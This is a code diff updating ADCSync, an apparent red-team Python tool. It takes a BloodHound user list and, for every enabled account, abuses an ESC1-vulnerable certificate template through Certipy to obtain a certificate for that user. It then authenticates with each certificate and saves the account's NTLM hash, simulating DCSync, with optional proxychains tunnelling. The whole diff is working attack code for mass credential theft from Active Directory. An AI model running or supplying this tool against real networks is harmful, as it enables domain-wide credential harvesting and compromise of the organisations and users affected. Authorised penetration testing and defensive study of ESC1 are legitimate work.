@@ -4,9 +4,10 @@ import shutil
 import subprocess
 from tqdm import tqdm
 from pyfiglet import Figlet
-import click
-import ipaddress
-from ldap3 import Server, Connection, ALL, SIMPLE, SYNC, SUBTREE# Print stuff
+import argparse
+# from ldap3 import Server, Connection, ALL, SIMPLE, SYNC, SUBTREE# Print stuff
+from dataclasses import dataclass, field
+from typing import List
 
 ascii_art = Figlet(font='slant')
 print(ascii_art.renderText('ADCSync'))
@@ -19,18 +20,36 @@ else:
     print("Certipy not found. Please install Certipy before running ADCSync")
     exit(1)
 
-@click.command()
-@click.option('-f', '--file', help='Input User List JSON file from Bloodhound', required=True)
-@click.option('-o', '--output', help='NTLM Hash Output file', required=True)
-@click.option('-ca', help='Certificate Authority', required=True)
-@click.option('-dc-ip', help='IP Address of Domain Controller', required=True)
-@click.option('-u', '--user', help='Username', required=True)
-@click.option('-p', '--password', help='Password', required=True)
-@click.option('-template', help='Template Name vulnerable to ESC1', required=True)
-@click.option('-target-ip', help='IP Address of the target machine', required=True)
+def parse_args():
+    parser = argparse.ArgumentParser(description="Process BloodHound JSON user list and retrieve NTLM hashes via ADCS ESC1 technique to simulate DCSync.")
+    parser.add_argument('-f', '--file', help='Input User List JSON file from Bloodhound', required=True)
+    parser.add_argument('-o', '--output', help='NTLM Hash Output file', required=True)
+    parser.add_argument('-ca-name', help='Certificate Authority', required=True)
+    parser.add_argument('-dc-ip', help='IP Address of Domain Controller', required=True)
+    parser.add_argument('-dc-fqdn', help='FQDN of Domain Controller', required=True)
+    parser.add_argument('-u', '--user', help='Username', required=True)
+    parser.add_argument('-p', '--password', help='Password', required=True)
+    parser.add_argument('-template', help='Template Name vulnerable to ESC1', required=True)
+    parser.add_argument('-target', help='CA FQDN', required=True)
+    parser.add_argument('-debug', action='store_true', help='Show verbose debugging information')
+    parser.add_argument('-proxychains', action='store_true', help='Use proxychains4 with whatever config you have set in /etc/proxychains.conf')
 
+    return parser.parse_args()
 
-def main(file, output, ca, dc_ip, user, password, template, target_ip):
+@dataclass
+class AccountInfo:
+    spn: str
+    domain: str
+    sid: str
+    username: str
+    usernameLower: str
+    pfx_filepath: str
+
+@dataclass
+class AccountList:
+    accounts: List[AccountInfo] = field(default_factory=list)  # Ensure the list is initialized
+
+def main(file, output, ca_name, dc_ip, dc_fqdn, user, password, template, target, debug, proxychains):
     # Read the JSON data from the file
     if not os.path.exists(file):
         print(f"Error: File '{file}' not found.")
@@ -43,36 +62,43 @@ def main(file, output, ca, dc_ip, user, password, template, target_ip):
         print(f"Error: The file '{file}' does not contain valid JSON.")
         exit(1)
 
-    # Extract the "name" values
-    names = []
-    for item in data['data']:
-        name = item['Properties']['name']
-        names.append(name)
+
+    accounts = AccountList()
+    # Extract the "name", "objectid", samaccountname, and domain values
+    for item in data['nodes']:
+        if item['props']['enabled']:
+            name = str(item['props']['name']).lower()
+            sid = item['props']['objectid']
+            baseDomainAD = str(item['props']['domain']).lower()
+            justUsernameLower = str(item['props']['samaccountname']).lower()
+            justUsername = str(item['props']['samaccountname'])
+            accounts.accounts.append(AccountInfo(spn=name, sid=sid, domain=baseDomainAD, username=justUsername, usernameLower=justUsernameLower, pfx_filepath=''))
 
     # Create the "certificates" folder if it doesn't exist
     certificates_folder = 'certificates'
     if not os.path.exists(certificates_folder):
         os.makedirs(certificates_folder)
 
-    # Extract the domain from the username and store it in a dictionary
-    usernames_with_domains = {}
-    for item in data['data']:
-        name = item['Properties']['name']
-        domain = name.split('@')[-1]  # Extract the domain from the username
-        username = name.split('@')[0].lower()
-        usernames_with_domains[f'{username}@{domain}'] = domain
+    # debug statement
+    if debug:
+        for account in accounts.accounts:
+            print(account)
 
     # Execute certipy req command for each name
-    print('Grabbing user certs:')
-    for name in tqdm(names):
-        # Extract the part before the "@" symbol and convert it to lowercase
-        username = name.split('@')[0].lower()
-        domain = usernames_with_domains.get(f'{username}@{domain}')
-
-        command = [
-            certipy_client, 'req', '-u', user, '-p', password, '-target-ip', target_ip,
-            '-dc-ip', dc_ip, '-ca', ca, '-template', template, '-upn', name
-        ]
+    print(f'[+] Grabbing certs for {len(accounts.accounts)} accounts:')
+    for account in tqdm(accounts.accounts):
+        upn = f"'{account.spn}'"
+        sid = f"'{account.sid}'"
+        if proxychains:
+            command = [
+                'proxychains4', certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
+                  '-template', template, '-upn', upn, '-dns', dc_fqdn, '-sid', sid
+            ]
+        else:
+            command = [
+                certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
+                  '-template', template, '-upn', upn, '-sid', sid
+            ]
         process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
         # Check the return code and error output of certipy
@@ -82,8 +108,9 @@ def main(file, output, ca, dc_ip, user, password, template, target_ip):
 
         # Move the generated .pfx file to the "certificates" folder if it exists
         for filename in os.listdir('.'):
-            if filename.endswith('.pfx') and filename.startswith(username):
+            if filename.endswith('.pfx') and filename.startswith(account.usernameLower):
                 destination = os.path.join(certificates_folder, filename)
+                account.pfx_filepath = destination
                 shutil.move(filename, destination)
 
     # Create the "caches" folder if it doesn't exist
@@ -93,24 +120,21 @@ def main(file, output, ca, dc_ip, user, password, template, target_ip):
 
     # Execute command for each .pfx file in the "certificates" folder and record the output
     with open(output, 'a') as output_file:
-        for filename in os.listdir(certificates_folder):
-            if filename.endswith('.pfx'):
-                certificate = os.path.join(certificates_folder, filename)
-                username = os.path.splitext(filename.split('@')[0].lower())[0]
-
-                # Get the domain associated with the username
-                domain = usernames_with_domains.get(f'{username}@{domain}')
-
-                command = [certipy_client, 'auth', '-pfx', certificate, '-username', username, '-dc-ip', dc_ip]
+        for account in accounts.accounts:
+            if str(account.pfx_filepath).endswith('.pfx'):
+                if proxychains:
+                    command = ['proxychains4', certipy_client, 'auth', '-pfx', account.pfx_filepath, '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
+                else:
+                    command = [certipy_client, 'auth', '-pfx', account.pfx_filepath,  '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
                 process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                 stdout, stderr = process.communicate()
 
                 # Extract the NT hash from the stdout
                 output_lines = stdout.strip().split('\n')
-                nt_hash = output_lines[-1].split(': ')[1]
+                ntlm_hash = output_lines[-1].split(': ')[1]
 
                 # Format the output
-                output_format = f'{domain}/{username}::{nt_hash}:::'
+                output_format = f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)'
 
                 # Print the output to the terminal
                 print(output_format)
@@ -119,9 +143,10 @@ def main(file, output, ca, dc_ip, user, password, template, target_ip):
                 output_file.write(output_format + '\n')
 
                 # Move the .ccache file to the "caches" folder if it exists
-                ccache_file = f'{username}.ccache'
+                ccache_file = f'{account.usernameLower}.ccache'
                 if os.path.exists(ccache_file):
                     shutil.move(ccache_file, os.path.join(caches_folder, ccache_file))
 
 if __name__ == '__main__':
-    main()
+    args = parse_args()
+    main(args.file, args.output, args.ca_name, args.dc_ip, args.dc_fqdn, args.user, args.password, args.template, args.target, args.debug, args.proxychains)
